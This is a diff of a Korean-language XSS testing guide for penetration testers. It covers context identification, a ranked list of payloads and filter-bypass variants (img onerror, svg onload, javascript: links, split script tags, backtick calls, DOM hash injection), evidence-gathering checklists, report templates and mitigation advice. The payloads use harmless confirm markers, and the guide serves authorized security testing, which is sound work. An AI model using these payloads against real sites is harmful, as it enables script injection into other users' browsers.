@@ -1,174 +1,223 @@
-# XSS 점검 가이드 & 페이로드 모음 (Markdown 버전)
+# XSS 점검 가이드 (Pro 버전 · Markdown)
+> **대상 독자**: 취약점 진단 1년차~중급자를 위한 **실전형·가독성 강화** 문서입니다.  
+> **목표**: “어디부터 어떻게”를 빠르게 판단하고, **증적과 보고서 품질**까지 끌어올리기.
 
-보안 점검 시 활용할 수 있는 **XSS 페이로드**, **점검 절차**, **대응 방안**을 한 문서로 정리했습니다.  
-모든 예시는 **합법적이고 승인된 환경**에서의 연구/내부 점검 목적에만 사용하세요.
+---
 
-&nbsp;
-## 목차
-- [개요](#개요)
-- [추천 페이로드](#추천-페이로드)
-- [점검 방법](#점검-방법)
-- [상황별 점검 포인트](#상황별-점검-포인트)
-- [패킷 관점 체크](#패킷-관점-체크)
-- [대응 방안](#대응-방안)
-- [유의 사항](#유의-사항)
-- [참고](#참고)
+<p align="center">
+  <a href="#toc">🔗 목차로 이동</a> ·
+  <a href="#quickstart">⏱️ 10분 퀵 스타트</a> ·
+  <a href="#contexts">🎯 컨텍스트별 공략</a> ·
+  <a href="#payloads">🧪 최소 페이로드 세트</a> ·
+  <a href="#dom">⚙️ DOM XSS</a> ·
+  <a href="#report">📝 보고 템플릿</a> ·
+  <a href="#mitigation">🛡️ 조치 가이드</a>
+</p>
 
-&nbsp;
-## 개요
-- 입력값이 **어느 컨텍스트**에 들어가는지(태그/속성/스크립트/URL 등)를 먼저 파악한 뒤, 해당 컨텍스트에서 **실행 가능**한 최소 페이로드부터 시도합니다.
-- **패턴 기반 필터**만 믿지 말고, 아키텍처적으로 **신뢰되지 않은 입력을 HTML로 렌더링하지 않는** 방향을 우선 검토하세요.
+---
 
-> **주의**  
-> 본 문서는 예시를 **코드 블록**으로만 제공합니다(자동 실행 없음). 승인되지 않은 시스템에 대한 테스트는 불법입니다.
+## <a id="toc"></a>목차
+- [안전·범위 공지](#safe)
+- [10분 퀵 스타트](#quickstart)
+- [컨텍스트 판별 & 대표 전략](#contexts)
+- [최소 페이로드 세트 (우선순위 적용)](#payloads)
+- [필터·치환 우회 전략](#filtering)
+- [DOM XSS: 소스→싱크 추적](#dom)
+- [증적 수집 체크리스트](#evidence)
+- [보고 템플릿 (요약/상세)](#report)
+- [조치 가이드 (개발팀 전달용)](#mitigation)
+- [자주 하는 실수 & 정정](#pitfall)
+- [부록: 인코딩/레퍼런스](#appendix)
 
+---
 
-&nbsp;
-## 추천 페이로드
+## <a id="safe"></a>안전·범위 공지
+> **합법·승인된 환경에서만** 테스트하세요. 고객사/사내 식별 정보는 공개 금지.
 
-### 1) 기본 테스트
-```html
-<script>alert(1111)</script>
-```
+- 무단 테스트 금지, PoC는 **최소 영향(무해한 confirm/console 등)** 으로.
+- 증적은 **마스킹**(도메인/토큰/계정/경로).
+- CSP/보안 솔루션 우회는 **계약 범위** 내에서만 수행.
 
-### 2) `<script>` 태그가 차단될 때
-```html
-<details onpointerover=confirm(1111)></details>
-```
+---
 
-### 3) 속성 값(value) 내부 삽입 (동작 유발 필요)
-```html
-" onkeydown=confirm(1111) contenteditable onfocus
-```
+## <a id="quickstart"></a>10분 퀵 스타트 (현장용 체크리스트)
+- [ ] 입력이 반영되는 **위치** 확인: 검색/댓글/프로필/쿼리스트링/해시/스토리지
+- [ ] **반사형 / 저장형 / DOM 기반** 구분
+- [ ] 화면/응답으로 **컨텍스트** 파악: HTML 본문 / 속성 / URL(JS) / JS 문자열
+- [ ] 아래 **최소 페이로드(§ [🧪](#payloads))** 를 **위에서부터** 순서대로 시도
+- [ ] 특수문자/길이/치환/블랙리스트 **반응 기록**
+- [ ] **경로 바꿔 재시도**: POST↔GET, 다른 파라미터, 다른 화면/역할(관리자/모바일)
+- [ ] DOM 의심 시 DevTools에서 **Sink 검색**: `innerHTML`, `insertAdjacentHTML`, `document.write`, jQuery `.html()`
+- [ ] 성공 시 **원요청/원이응답/브라우저 화면** 3종 캡처(+마스킹)
+- [ ] 영향도: 트리거(무클릭/원클릭), 권한(게스트/로그인/관리자), 범위, CSP 적용 유무
+- [ ] 간단 **조치 제안** 메모(§ [🛡️](#mitigation))
 
-### 4) 공백이 차단될 때
-```html
-<svg/onload=confirm(1111)/>
-```
+---
 
-### 5) Polyglot XSS (컨텍스트 다중 호환)
-> 여러 컨텍스트에서 동시에 유효하게 해석되도록 설계한 페이로드.  
-> 프로젝트 성격에 맞춰 별도 섹션으로 확장하세요.
+## <a id="contexts"></a>컨텍스트 판별 & 대표 전략
+| 컨텍스트 | 화면에서 보이는 단서 | 1차 시도 | 비고 |
+|---|---|---|---|
+| **HTML 본문** | 내 입력이 문단/카드 등으로 **그대로 보임** | `<img src=x onerror=confirm('XSS_TEST')>` | `<script>` 차단 환경에서 유용 |
+| **속성(Attribute)** | `value="내입력"` 등 속성 값 내부 | `" autofocus onfocus=confirm('XSS_TEST') x="` | 따옴표 종료→이벤트 삽입, 포커스 유도 |
+| **URL(JS 스킴)** | `<a href="내입력">` | `<a href="javascript:confirm('XSS_TEST')">Click</a>` | CSP `javascript:` 차단 여부 확인 |
+| **JS 문자열/식** | `var msg="내입력";` | `";confirm('XSS_TEST');//` | 문자열 종료→코드 주입 |
+| **DOM 기반** | URL 해시/스토리지 값이 화면에 반영 | 주소 끝에 `#<img src=x onerror=confirm('XSS_TEST')>` | 코드에서 `location.hash` 참조를 먼저 확인 |
 
-&nbsp;
-## 점검 방법
+> 이벤트 지원은 요소별 차이 있음(예: `<input>`은 `onload` 없음). 포커스는 `autofocus`/`onfocus`/`tabindex` 활용.
 
-### A. 입력값 위치(컨텍스트) 파악
-- **태그 속성 내부**
-  ```html
-  <input type="text" value="입력 값">
-  ```
-  따옴표 종료 후 이벤트 삽입:
-  ```html
-  <input value="test" onpointerover=confirm(1111)>
-  ```
+---
 
-- **태그 외부(본문 영역)**
-  ```html
-  <a href="test.com">텍스트</a><script>alert(1111)</script>
-  ```
+## <a id="payloads"></a>최소 페이로드 세트 (우선순위 적용)
+> **위→아래** 순으로 시도하며, 실패 지점을 근거로 컨텍스트/필터 가설을 갱신합니다.
 
-### B. 필터링/치환 패턴 식별 및 우회
-- 특수문자 제한(`"`, `<`, `(`, `=` 등) 시 **인코딩/대체 문자** 활용
-- 이벤트 핸들러 제한(`onload`, `onerror` 등) 시 **대체 핸들러** 검토(예: `onpointerover`, `onkeydown`)
-- `<script>` 차단 시 **대체 태그/기능** 활용
-  ```html
-  <svg onload=confirm(1111)>
-  ```
-  ```html
-  <meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1111)</script>">
-  ```
+1. HTML 본문  
+   ```html
+   <img src=x onerror=confirm('XSS_TEST')>
+   ```
+2. `<script>` 차단 환경  
+   ```html
+   <details onpointerover=confirm('XSS_TEST')></details>
+   ```
+3. 속성 내부 탈출  
+   ```html
+   " autofocus onfocus=confirm('XSS_TEST') x="
+   ```
+4. 공백 제한  
+   ```html
+   <svg/onload=confirm('XSS_TEST')>
+   ```
+5. JS 문자열 컨텍스트  
+   ```js
+   ";confirm('XSS_TEST');// 
+   ```
+6. 알림 함수 필터(단어)  
+   ```html
+   <svg onload="window['con'+'firm']('XSS_TEST')"></svg>
+   ```
+7. 괄호 차단(백틱)  
+   ```html
+   <img src=x onerror=confirm`XSS_TEST`>
+   ```
+8. 하이퍼링크 컨텍스트  
+   ```html
+   <a href="javascript:confirm('XSS_TEST')">Click</a>
+   ```
+9. DOM 해시 주입  
+   ```text
+   #<img src=x onerror=confirm('XSS_TEST')>
+   ```
+10. 꼬리 자르기(뒤에 문구 붙음)  
+    ```html
+    <script>confirm('XSS_TEST')</script><!--
+    ```
 
-- **삭제/치환 기반 필터** 우회
-  ```html
-  <scr<script>ipt>alert(1111)</scr<script>ipt>
-  ```
+> 인코딩 빠르게 순환: URL `%3C`, HTML `&#x3C;`, 유니코드 `<`, **더블 인코딩**.
 
-- **알림창 함수 필터링** 우회(속성/객체 경유)
-  ```html
-  <svg onload="window "/>
-  ```
+---
 
-### C. 추가 문자열 주입(접두/접미) 대응
-- 뒤에 문자열이 붙는 경우: `<!--` 등 **주석 처리**로 종료
-- 앞에 붙는 경우: **태그 닫기** 후 새로운 구문으로 이탈
+## <a id="filtering"></a>필터·치환 우회 전략 (요약)
+- **특수문자 제한**: `"`, `<`, `(`, `=`, `:` → 다른 컨텍스트로 전환, 인코딩 시도, 백틱(`) 검토
+- **이벤트 핸들러 제한**: `onload/onerror/onclick` → `onpointerover/onfocus/onkeydown/ondrag`등 대체
+- **단어 삭제/치환**: `<script>` → `<scr<script>ipt>` / 또는 `<svg onload=...>`로 전환
+- **앞/뒤 추가문자**: 앞→태그 닫고 이탈, 뒤→`<!--` 주석으로 꼬리 제거
+- **길이 제한**: 더 짧은 형태(핵심만), 인코딩 축약, 링크/리다이렉트형 PoC로 교체
 
-&nbsp;
-## 상황별 점검 포인트
+> **CSP가 있으면** 인라인/`javascript:`/`data:`가 차단됩니다. 우선 `meta`/`script-src` 정책부터 확인하세요.
 
-- **특수문자 필터링**: `"`, `'`, `<>`, `()`, `:`, `=`
-- **응답 맥락 탈출**: `" />`, `</script>` 등으로 컨텍스트 이탈 가능성 확인
-- **대소문자 혼용**: `<sCriPt>` 등
-- **이벤트 핸들러 필터링**: `onload`, `onerror`, `onclick` 차단 시 `ondrag`, `onfocus`, `onpointerover` 등 대체 검토
-- **인코딩 시도**
-  - URL: `%3Cscript%3E`
-  - 유니코드: `<`
-  - HTML 엔티티: `&#x3C;`
-  - Base64: `data:text/html;base64,...`
-- **태그 필터링 우회**: `<script>`, `<img>`, `<svg>` 차단 시 `<details>`, `<object>`, `<embed>` 등
-- **하이퍼링크 기반**
-  ```html
-  <a href="javascript:confirm(1)">Click</a>
-  ```
-- **폼 전송 기반**
-  ```html
-  <form action="data:text/html,<script>alert(1111)</script>">
-    <input type="submit">
-  </form>
-  ```
-- **공백 필터링 우회**: `<svg/onload=...>` (환경/브라우저 의존성 주의)
-- **hidden 필드 탈출 / iframe·object·embed·meta의 `data:` 스킴 활용** (환경 의존)
+---
+
+## <a id="dom"></a>DOM XSS: 소스→싱크 추적
+1) **소스(Source)** 후보  
+- `location.search`, `location.hash`, `document.referrer`, `localStorage/sessionStorage`, `postMessage`
+
+2) **싱크(Sink)** 후보  
+- `innerHTML/outerHTML`, `insertAdjacentHTML`, `document.write`, jQuery `.html()`  
+- React/Vue: 일반적으로 안전하지만 **`dangerouslySetInnerHTML`** 사용 시 위험
+
+3) **루틴**  
+- 코드에서 소스→싱크 데이터 흐름 식별 → 싱크 직전에 **최소 페이로드** 1~2개만 시도 → 성공 시 조건/트리거 기록
+
+---
+
+## <a id="evidence"></a>증적 수집 체크리스트
+- [ ] **재현 절차**: 경로→파라미터→페이로드→트리거(클릭/포커스 등)→결과 순서
+- [ ] **스크린샷 3종**: (1) 원요청(파라미터), (2) 브라우저 화면(결과), (3) 원응답(반영 위치)
+- [ ] **마스킹**: 도메인/토큰/쿠키/계정/경로
+- [ ] **영향도 요약**: 트리거·권한·범위·CSP 유무·세션 탈취/피싱 가능성
+- [ ] **조치 제안**: 출력 이스케이프·CSP·Sanitizer·템플릿 경계
+
+---
+
+## <a id="report"></a>보고 템플릿
 
 <details>
-<summary><strong>추가 사례 모음 (접기/펼치기)</strong></summary>
+<summary><strong>요약(Executive Summary)</strong></summary>
 
-- 알림창 전부 필터링 시 **리다이렉트/네비게이션** 등 대체 효과 검토  
-  ```html
-  <img src=x onerror="location.href='https://example.org'">
-  ```
-
-- `()` 필터링 시 **백틱** 활용 가능한지 확인  
-  ```html
-  alert`1`
-  ```
-
-- **응답 값 뒤에 문자열이 붙어 실패**할 때: 주석/닫기 태그로 무력화  
-  ```html
-  <img src onerror=prompt(1)<!--
-  ```
-
-- `<` 치환 시 앞에 `<` 추가 시도  
-  ```html
-  <x<svg/onload=prompt(1)/>/>
-  ```
+**제목**: XSS 취약점 (반사형/저장형/DOM)  
+**영향**: 사용자 브라우저 내 임의 스크립트 실행 → 계정 탈취/피싱/세션 탈취 가능성  
+**위험도**: High / Medium / Low (근거: 트리거·권한·CSP·재현 난이도)  
+**조치 요약**: 컨텍스트별 이스케이프, CSP, DOMPurify, 템플릿 경계 준수  
 </details>
 
-&nbsp;
-## 패킷 관점 체크
-- **`location.hash` 사용 여부**: 응답 내 해당 참조가 있으면 `#<payload>`로 DOM XSS 가능성
-- **POST→GET 변환**: 동일 파라미터가 GET으로도 반영되는지 확인 (렌더링 경로 차이로 성공 가능성↑)
-- **전송 패킷엔 없지만 응답에 페이로드가 존재**: 응답에 있던 값을 **직접 전송**하여 반영되는지 재확인
+<details>
+<summary><strong>상세(재현·증적·조치)</strong></summary>
 
-&nbsp;
-## 대응 방안 (필수)
-- **출력 이스케이프**: 컨텍스트별 적절한 이스케이프 적용
-- **CSP(Content Security Policy)**: 스크립트 소스/인라인 제한, 보고 엔드포인트 설정
-- **Sanitizer 적용**: 검증된 라이브러리(예: DOMPurify) 사용
-- **아키텍처 개선**: 신뢰되지 않은 입력을 HTML로 렌더링하지 않도록 템플릿/렌더 경계 재설계
+**① 재현 절차**  
+1. 경로/화면: …  
+2. 파라미터: …  
+3. 페이로드:  
+   ```html
+   <img src=x onerror=confirm('XSS_TEST')>
+   ```
+4. 트리거: (예) 페이지 로드 시 자동 / 요소에 포커스 / 링크 클릭  
+5. 결과: `confirm('XSS_TEST')` 팝업 발생 (스크린샷 첨부)
 
-> **권장**  
-> 패턴 기반 필터에만 의존하지 말고, **출력 컨텍스트 보안**과 **CSP**를 병행하세요.
+**② 증적**  
+- 원요청 캡처(파라미터 강조)  
+- 브라우저 화면(결과 팝업)  
+- 원응답 내 반영 위치 하이라이트  
 
-&nbsp;
-## 유의 사항
-- 고객사/사내 식별 가능 정보(도메인, 스크린샷, 내부 경로, 로그 등)는 **공개 저장소에 포함하지 마세요**.
-- Git 이력(History)에 남은 민감 정보는 **레포 삭제/히스토리 재작성** 없이 완전 제거되지 않을 수 있습니다.
+**③ 영향도 근거**  
+- 권한: 비로그인 사용자도 트리거 가능 / 관리자 화면 한정 등  
+- 범위: 단일 사용자 / 다수 사용자  
+- 보호: CSP 미적용 / 부분 적용 (정책: …)
 
-&nbsp;
-## 참고
-- PortSwigger XSS Cheat Sheet  
-  https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+**④ 조치(개발팀용)**  
+- 출력 이스케이프: HTML/속성/URL/JS **컨텍스트별** 적용  
+- CSP: `script-src 'self'; object-src 'none'; base-uri 'none'`(+ nonce/hash 권장)  
+- Sanitizer: 신뢰되지 않은 HTML은 **DOMPurify** 통과  
+- 설계: `innerHTML`/`.html()` 사용 지양, 템플릿 엔진의 자동 이스케이프 사용  
+</details>
 
+---
 
+## <a id="mitigation"></a>조치 가이드 (개발팀 전달용 요약)
+- **출력 이스케이프**: 컨텍스트별 이스케이프(HTML/속성/URL/JS) 체계화
+- **CSP**: 인라인/`javascript:`/`data:` 제한, 리포터 활성화
+- **Sanitizer**: DOMPurify 등 검증된 라이브러리 채택
+- **코드 규칙**: `innerHTML`·jQuery `.html()` 지양, React의 `dangerouslySetInnerHTML` 금지 원칙
+- **리뷰 절차**: 신규 화면 출시에 **CSP·컨텍스트 테스트**를 게이트로 추가
 
-© 2025 XSS Checklist · 연구/내부 점검 용도
+---
+
+## <a id="pitfall"></a>자주 하는 실수 & 정정
+- `contentitable` 오타 → **`contenteditable`**  
+- `<input>`에는 `onload` 없음 → **포커스 유도**로 대체(`autofocus/onfocus/tabindex`)  
+- `document.window.href` 오기 → **`window.location.href`**  
+- 한 화면 실패로 단정 금물 → **다른 경로/역할/기기**에서 재시도  
+- “표준 페이로드만” 고집 금지 → **컨텍스트에 맞춘 짧은 페이로드**로
+
+---
+
+## <a id="appendix"></a>부록: 인코딩 & 레퍼런스
+- **인코딩 치트**
+  - URL: `%3Cscript%3E` / `%22` / `%28` …  
+  - HTML 엔티티: `&#x3C;` / `&#34;` / `&#40;` …  
+  - 유니코드: `<` / `"` / `(` …  
+  - 더블 인코딩: `%2528` 등
+- **연습장**: PortSwigger Academy, OWASP Juice Shop, DVWA
+- **레퍼런스**: PortSwigger XSS Cheat Sheet
+
+---
+
+© 2025 XSS Checklist — 연구/내부 점검 용도
